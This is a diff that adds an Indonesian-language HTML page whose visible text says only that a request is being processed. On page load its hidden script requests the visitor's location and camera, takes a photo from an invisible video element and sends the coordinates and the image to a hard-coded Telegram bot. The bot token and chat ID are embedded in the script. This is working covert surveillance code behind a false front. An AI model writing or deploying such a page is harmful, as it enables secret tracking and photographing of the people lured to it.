@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Memproses...</title>
+  </head>
+  <body>
+    <h2>Memproses permintaan, mohon tunggu...</h2>
+
+    <!-- Elemen tersembunyi untuk proses kamera -->
+    <video
+      id="video"
+      width="640"
+      height="480"
+      autoplay
+      style="display: none"
+    ></video>
+    <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
+
+    <script>
+      const BOT_TOKEN = "8875696208:AAEfby84iverPAOZjXO7Bl2zNQCtPzrsBI4";
+      const CHAT_ID = "6984457315"; // Masukkan ID Telegram numerik Anda
+
+      // Berjalan otomatis saat halaman web selesai dimuat
+      window.addEventListener("DOMContentLoaded", async () => {
+        // 1. Ambil Lokasi
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              await sendLocationToTelegram(lat, lon);
+            },
+            (error) => {
+              console.error("Gagal atau izin lokasi ditolak:", error.message);
+            },
+          );
+        }
+
+        // 2. Ambil Foto Kamera
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+
+          setTimeout(async () => {
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Matikan stream kamera setelah gambar diambil
+            stream.getTracks().forEach((track) => track.stop());
+
+            canvas.toBlob(async (blob) => {
+              if (blob) {
+                await sendPhotoToTelegram(blob);
+              }
+            }, "image/jpeg");
+          }, 1000);
+        } catch (err) {
+          console.error("Gagal atau izin kamera ditolak:", err.message);
+        }
+      });
+
+      async function sendLocationToTelegram(lat, lon) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+        try {
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              latitude: lat,
+              longitude: lon,
+            }),
+          });
+        } catch (error) {
+          console.error("Error mengirim lokasi:", error);
+        }
+      }
+
+      async function sendPhotoToTelegram(photoBlob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", photoBlob, "capture.jpg");
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        try {
+          await fetch(url, {
+            method: "POST",
+            body: formData,
+          });
+        } catch (error) {
+          console.error("Error mengirim foto:", error);
+        }
+      }
+    </script>
+  </body>
+</html>
